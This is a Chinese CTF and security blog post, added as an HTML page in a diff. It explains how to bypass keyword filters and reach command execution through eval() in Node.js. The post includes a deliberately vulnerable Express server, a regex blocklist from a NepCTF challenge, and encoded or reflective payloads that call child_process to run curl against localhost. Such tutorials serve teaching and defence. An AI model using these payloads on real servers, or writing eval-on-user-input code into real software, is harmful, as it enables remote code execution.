@@ -1,0 +1,579 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+
+    <title>Nodejs中代码执行绕过的一些技巧 | sakai&#39;s blog</title>
+    <meta property="og:title" content="Nodejs中代码执行绕过的一些技巧 - sakai&#39;s blog">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2021-05-04T14:07:45&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2021-05-04T14:07:45&#43;08:00'>
+        
+    <meta name="Keywords" content="web,java,python,CTF,内网">
+    <meta name="description" content="Nodejs中代码执行绕过的一些技巧">
+        
+    <meta name="author" content="sakai">
+    <meta property="og:url" content="http://segogt.github.io/post/nodejs%E4%B8%AD%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/">
+    <link rel="shortcut icon" href='/favicon.ico'  type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+        <link href="https://cdn.bootcdn.net/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" rel="stylesheet">
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="http://segogt.github.io/">
+                        sakai&#39;s blog
+                    </a>
+                
+                <p class="description">web/java/python/CTF</p>
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="current" href="http://segogt.github.io/">首页</a>
+                    
+                    <a  href="http://segogt.github.io/archives/" title="归档">归档</a>
+                    
+                    <a  href="http://segogt.github.io/about/" title="关于">关于</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    <style type="text/css">
+    .post-toc {
+        position: fixed;
+        width: 200px;
+        margin-left: -210px;
+        padding: 5px 10px;
+        font-family: Athelas, STHeiti, Microsoft Yahei, serif;
+        font-size: 12px;
+        border: 1px solid rgba(0, 0, 0, .07);
+        border-radius: 5px;
+        background-color: rgba(255, 255, 255, 0.98);
+        background-clip: padding-box;
+        -webkit-box-shadow: 1px 1px 2px rgba(0, 0, 0, .125);
+        box-shadow: 1px 1px 2px rgba(0, 0, 0, .125);
+        word-wrap: break-word;
+        white-space: nowrap;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        z-index: 999;
+        cursor: pointer;
+        max-height: 70%;
+        overflow-y: auto;
+        overflow-x: hidden;
+    }
+
+    .post-toc .post-toc-title {
+        width: 100%;
+        margin: 0 auto;
+        font-size: 20px;
+        font-weight: 400;
+        text-transform: uppercase;
+        text-align: center;
+    }
+
+    .post-toc .post-toc-content {
+        font-size: 15px;
+    }
+
+    .post-toc .post-toc-content>nav>ul {
+        margin: 10px 0;
+    }
+
+    .post-toc .post-toc-content ul {
+        padding-left: 20px;
+        list-style: square;
+        margin: 0.5em;
+        line-height: 1.8em;
+    }
+
+    .post-toc .post-toc-content ul ul {
+        padding-left: 15px;
+        display: none;
+    }
+
+    @media print,
+    screen and (max-width:1057px) {
+        .post-toc {
+            display: none;
+        }
+    }
+</style>
+<div class="post-toc" style="position: absolute; top: 188px;">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#21-16进制编码">2.1 16进制编码</a></li>
+    <li><a href="#22-unicode编码">2.2 unicode编码</a></li>
+    <li><a href="#23-加号拼接">2.3 加号拼接</a></li>
+    <li><a href="#24-模板字符串">2.4 模板字符串</a></li>
+    <li><a href="#25-concat连接">2.5 concat连接</a></li>
+    <li><a href="#26-base64编码">2.6 base64编码</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#31-obejctkeys">3.1 Obejct.keys</a></li>
+    <li><a href="#32-reflect">3.2 Reflect</a></li>
+    <li><a href="#33-过滤中括号的情况">3.3 过滤中括号的情况</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+<script type="text/javascript">
+    $(document).ready(function () {
+        var postToc = $(".post-toc");
+        if (postToc.length) {
+            var leftPos = $("#main").offset().left;
+            if(leftPos<220){
+                postToc.css({"width":leftPos-10,"margin-left":(0-leftPos)})
+            }
+
+            var t = postToc.offset().top - 20,
+                a = {
+                    start: {
+                        position: "absolute",
+                        top: t
+                    },
+                    process: {
+                        position: "fixed",
+                        top: 20
+                    },
+                };
+            $(window).scroll(function () {
+                var e = $(window).scrollTop();
+                e < t ? postToc.css(a.start) : postToc.css(a.process)
+            })
+        }
+    })
+</script>
+    <article class="post">
+        <header>
+            <h1 class="post-title">Nodejs中代码执行绕过的一些技巧</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2021年5月4日
+        </date>
+        
+        <div class="post-meta">
+            <span>|</span>
+            
+            <span class="meta-category"><a href='/categories/ctf'>ctf</a></span>
+            
+            <span class="meta-category"><a href='/categories/web'>web</a></span>
+            
+        </div>
+        
+        
+        
+        <div class="clear" style="display: none">
+            <div class="toc-article">
+                <div class="toc-title">文章目录</div>
+            </div>
+        </div>
+        
+        <div class="post-content">
+            <blockquote>
+<p>本文已在<strong>安全客</strong>平台发布，转载，请参考<a href="https://www.anquanke.com/note/repost">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/237032">https://www.anquanke.com/post/id/237032</a></p>
+</blockquote>
+<p>在php中，eval代码执行是一个已经被玩烂了的话题，各种奇技淫巧用在php代码执行中来实现bypass。这篇文章主要讲一下<code>nodejs</code>中bypass的一些思路。</p>
+<h1 id="1-child_process">1. child_process</h1>
+<p>首先介绍一下nodejs中用来执行系统命令的模块<code>child_process</code>。Nodejs通过使用child_process模块来生成多个子进程来处理其他事物。在child_process中有七个方法它们分别为：execFileSync、spawnSync,execSync、fork、exec、execFile、以及spawn,而这些方法使用到的都是spawn()方法。因为<code>fork</code>是运行另外一个子进程文件，这里列一下除fork外其他函数的用法。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>).<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;sleep 3&#34;</span>);
+<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>).<span style="color:#a6e22e">execSync</span>(<span style="color:#e6db74">&#34;sleep 3&#34;</span>);
+<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>).<span style="color:#a6e22e">execFile</span>(<span style="color:#e6db74">&#34;/bin/sleep&#34;</span>,[<span style="color:#e6db74">&#34;3&#34;</span>]); <span style="color:#75715e">//调用某个可执行文件，在第二个参数传args
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>).<span style="color:#a6e22e">spawn</span>(<span style="color:#e6db74">&#39;sleep&#39;</span>, [<span style="color:#e6db74">&#39;3&#39;</span>]);
+<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>).<span style="color:#a6e22e">spawnSync</span>(<span style="color:#e6db74">&#39;sleep&#39;</span>, [<span style="color:#e6db74">&#39;3&#39;</span>]);
+<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>).<span style="color:#a6e22e">execFileSync</span>(<span style="color:#e6db74">&#39;sleep&#39;</span>, [<span style="color:#e6db74">&#39;3&#39;</span>]);
+</code></pre></div><p>不同的函数其实底层具体就是调用spawn，有兴趣的可以跟进源码看一下</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">child</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">spawn</span>(<span style="color:#a6e22e">file</span>, <span style="color:#a6e22e">args</span>, {
+  <span style="color:#a6e22e">cwd</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">cwd</span>,
+  <span style="color:#a6e22e">env</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">env</span>,
+  <span style="color:#a6e22e">gid</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">gid</span>,
+  <span style="color:#a6e22e">uid</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">uid</span>,
+  <span style="color:#a6e22e">shell</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">shell</span>,
+  <span style="color:#a6e22e">windowsHide</span><span style="color:#f92672">:</span> <span style="color:#f92672">!!</span><span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">windowsHide</span>,
+  <span style="color:#a6e22e">windowsVerbatimArguments</span><span style="color:#f92672">:</span> <span style="color:#f92672">!!</span><span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">windowsVerbatimArguments</span>
+});
+</code></pre></div><h1 id="2-nodejs中的命令执行">2. nodejs中的命令执行</h1>
+<p>为了演示代码执行，我写一个最简化的服务端，代码如下</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>()
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">urlencoded</span>({ <span style="color:#a6e22e">extended</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }))
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
+    <span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">code</span>;
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">code</span>);
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(eval(<span style="color:#a6e22e">code</span>));
+})
+ 
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>)
+</code></pre></div><p>原理很简单，就是接受<code>post</code>方式传过来的code参数，然后返回<code>eval(code)</code>的结果。</p>
+<p>在nodejs中，同样是使用<code>eval()</code>函数来执行代码，针对上文提到rce函数，首先就可以得到如下利用代码执行来rce的代码。</p>
+<blockquote>
+<p>以下的命令执行都用curl本地端口的方式来执行</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">eval(<span style="color:#e6db74">&#39;require(&#34;child_process&#34;).execSync(&#34;curl 127.0.0.1:1234&#34;)&#39;</span>)
+</code></pre></div><p>这是最简单的代码执行情况，当然一般情况下，开发者在用eval而且层层调用有可能接受用户输入的点，并不会简单的让用户输入直接进入，而是会做一些过滤。譬如，如果过滤了exec关键字，该如何绕过?</p>
+<blockquote>
+<p>当然实际不会这么简单，本文只是谈谈思路，具体可以根据实际过滤的关键字变通</p>
+</blockquote>
+<p>下面是微改后的服务端代码，加了个正则检测<code>exec</code>关键字</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>()
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">validcode</span>(<span style="color:#a6e22e">input</span>) {
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">re</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RegExp(<span style="color:#e6db74">&#34;exec&#34;</span>);
+  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">re</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">input</span>);
+}
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">urlencoded</span>({ <span style="color:#a6e22e">extended</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }))
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
+  <span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">code</span>;
+  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">code</span>);
+  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">validcode</span>(<span style="color:#a6e22e">code</span>)) {
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;forbidden!&#34;</span>)
+  } <span style="color:#66d9ef">else</span> {
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(eval(<span style="color:#a6e22e">code</span>));
+  }
+})
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>)
+</code></pre></div><p>这就有6种思路:</p>
+<ul>
+<li>16进制编码</li>
+<li>unicode编码</li>
+<li>加号拼接</li>
+<li>模板字符串</li>
+<li>concat函数连接</li>
+<li>base64编码</li>
+</ul>
+<h2 id="21-16进制编码">2.1 16进制编码</h2>
+<p>第一种思路是16进制编码，原因是在<code>nodejs</code>中，如果在字符串内用16进制，和这个16进制对应的ascii码的字符是等价的(第一反应有点像mysql)。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">===</span><span style="color:#e6db74">&#34;\x61&#34;</span>);
+<span style="color:#75715e">// true
+</span></code></pre></div><p>但是在上面正则匹配的时候，16进制却不会转化成字符，所以就可以绕过正则的校验。所以可以传</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>)[<span style="color:#e6db74">&#34;exe\x63Sync&#34;</span>](<span style="color:#e6db74">&#34;curl 127.0.0.1:1234&#34;</span>)
+</code></pre></div><h2 id="22-unicode编码">2.2 unicode编码</h2>
+<p>思路跟上面是类似的，由于<code>JavaScript</code>允许直接用码点表示Unicode字符，写法是&quot;反斜杠+u+码点&quot;，所以我们也可以用一个字符的unicode形式来代替对应字符。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;\u0061&#34;</span><span style="color:#f92672">===</span><span style="color:#e6db74">&#34;a&#34;</span>);
+<span style="color:#75715e">// true
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>)[<span style="color:#e6db74">&#34;exe\u0063Sync&#34;</span>](<span style="color:#e6db74">&#34;curl 127.0.0.1:1234&#34;</span>)
+</code></pre></div><h2 id="23-加号拼接">2.3 加号拼接</h2>
+<p>原理很简单，加号在js中可以用来连接字符，所以可以这样</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>)[<span style="color:#e6db74">&#39;exe&#39;</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;cSync&#39;</span>](<span style="color:#e6db74">&#39;curl 127.0.0.1:1234&#39;</span>)
+</code></pre></div><h2 id="24-模板字符串">2.4 模板字符串</h2>
+<p>相关内容可以参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals">MDN</a>，这里给出一个payload</p>
+<blockquote>
+<p>模板字面量是允许嵌入表达式的字符串字面量。你可以使用多行字符串和字符串插值功能。</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>)[<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#e6db74">`exe`</span><span style="color:#e6db74">}</span><span style="color:#e6db74">cSync`</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>](<span style="color:#e6db74">&#39;curl 127.0.0.1:1234&#39;</span>)
+</code></pre></div><h2 id="25-concat连接">2.5 concat连接</h2>
+<p>利用js中的concat函数连接字符串</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>)[<span style="color:#e6db74">&#34;exe&#34;</span>.<span style="color:#a6e22e">concat</span>(<span style="color:#e6db74">&#34;cSync&#34;</span>)](<span style="color:#e6db74">&#34;curl 127.0.0.1:1234&#34;</span>)
+</code></pre></div><h2 id="26-base64编码">2.6 base64编码</h2>
+<p>这种应该是比较常规的思路了。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">eval(<span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#e6db74">&#39;Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=&#39;</span>,<span style="color:#e6db74">&#39;base64&#39;</span>).<span style="color:#a6e22e">toString</span>())
+</code></pre></div><h1 id="3-其他bypass方式">3. 其他bypass方式</h1>
+<p>这一块主要是换个思路，上面提到的几种方法，最终思路都是通过编码或者拼接得到<code>exec</code>这个关键字，这一块考虑js的一些语法和内置函数。</p>
+<h2 id="31-obejctkeys">3.1 Obejct.keys</h2>
+<p>实际上通过<code>require</code>导入的模块是一个<code>Object</code>，所以就可以用<code>Object</code>中的方法来操作获取内容。利用<code>Object.values</code>就可以拿到<code>child_process</code>中的各个函数方法，再通过数组下标就可以拿到<code>execSync</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">constructor</span><span style="color:#f92672">===</span>Object)
+<span style="color:#75715e">//true
+</span><span style="color:#75715e"></span>Object.<span style="color:#a6e22e">values</span>(<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>))[<span style="color:#ae81ff">5</span>](<span style="color:#e6db74">&#39;curl 127.0.0.1:1234&#39;</span>)
+</code></pre></div><h2 id="32-reflect">3.2 Reflect</h2>
+<p>在js中，需要使用<code>Reflect</code>这个关键字来实现反射调用函数的方式。譬如要得到<code>eval</code>函数，可以首先通过<code>Reflect.ownKeys(global)</code>拿到所有函数，然后<code>global[Reflect.ownKeys(global).find(x=&gt;x.includes('eval'))]</code>即可得到eval</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">ownKeys</span>(<span style="color:#a6e22e">global</span>))
+<span style="color:#75715e">//返回所有函数
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">global</span>[<span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">ownKeys</span>(<span style="color:#a6e22e">global</span>).<span style="color:#a6e22e">find</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;eval&#39;</span>))])
+<span style="color:#75715e">//拿到eval
+</span></code></pre></div><p>拿到eval之后，就可以常规思路rce了</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">global</span>[<span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">ownKeys</span>(<span style="color:#a6e22e">global</span>).<span style="color:#a6e22e">find</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;eval&#39;</span>))](<span style="color:#e6db74">&#39;global.process.mainModule.constructor._load(&#34;child_process&#34;).execSync(&#34;curl 127.0.0.1:1234&#34;)&#39;</span>)
+</code></pre></div><p>这里虽然有可能被检测到的关键字，但由于<code>mainModule</code>、<code>global</code>、<code>child_process</code>等关键字都在字符串里，可以利用上面提到的方法编码，譬如16进制。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">global</span>[<span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">ownKeys</span>(<span style="color:#a6e22e">global</span>).<span style="color:#a6e22e">find</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;eval&#39;</span>))](<span style="color:#e6db74">&#39;\x67\x6c\x6f\x62\x61\x6c\x5b\x52\x65\x66\x6c\x65\x63\x74\x2e\x6f\x77\x6e\x4b\x65\x79\x73\x28\x67\x6c\x6f\x62\x61\x6c\x29\x2e\x66\x69\x6e\x64\x28\x78\x3d\x3e\x78\x2e\x69\x6e\x63\x6c\x75\x64\x65\x73\x28\x27\x65\x76\x61\x6c\x27\x29\x29\x5d\x28\x27\x67\x6c\x6f\x62\x61\x6c\x2e\x70\x72\x6f\x63\x65\x73\x73\x2e\x6d\x61\x69\x6e\x4d\x6f\x64\x75\x6c\x65\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x5f\x6c\x6f\x61\x64\x28\x22\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x22\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x22\x63\x75\x72\x6c\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x31\x32\x33\x34\x22\x29\x27\x29&#39;</span>)
+</code></pre></div><blockquote>
+<p>这里还有个小trick，如果过滤了<code>eval</code>关键字，可以用<code>includes('eva')</code>来搜索<code>eval</code>函数，也可以用<code>startswith('eva')</code>来搜索</p>
+</blockquote>
+<h2 id="33-过滤中括号的情况">3.3 过滤中括号的情况</h2>
+<p>在<code>3.2</code>中，获取到eval的方式是通过<code>global</code>数组，其中用到了中括号<code>[]</code>，假如中括号被过滤，可以用<code>Reflect.get</code>来绕</p>
+<blockquote>
+<p><code>Reflect.get(target, propertyKey[, receiver])</code>的作用是获取对象身上某个属性的值，类似于<code>target[name]</code>。</p>
+</blockquote>
+<p>所以取eval函数的方式可以变成</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">global</span>, <span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">ownKeys</span>(<span style="color:#a6e22e">global</span>).<span style="color:#a6e22e">find</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;eva&#39;</span>)))
+</code></pre></div><p>后面拼接上命令执行的payload即可。</p>
+<h1 id="4-nepctf-gamejs">4. NepCTF-gamejs</h1>
+<p>这个题目第一步是一个原型链污染，第二步是一个<code>eval</code>的命令执行，因为本文主要探讨一下eval的bypass方式，所以去掉原型链污染，只谈后半段bypass，代码简化后如下:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>()
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">validCode</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">func_code</span>){
+  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">validInput</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/subprocess|mainModule|from|buffer|process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base64|&#34;|&#39;|\[|\+|\*/ig</span>;
+  <span style="color:#66d9ef">return</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">validInput</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">func_code</span>);
+};
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">urlencoded</span>({ <span style="color:#a6e22e">extended</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }))
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
+  <span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">code</span>;
+  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">code</span>);
+  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">validCode</span>(<span style="color:#a6e22e">code</span>)) {
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;forbidden!&#34;</span>)
+  } <span style="color:#66d9ef">else</span> {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;(&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">code</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;)&#39;</span>;
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(eval(<span style="color:#a6e22e">d</span>));
+  }
+})
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>)
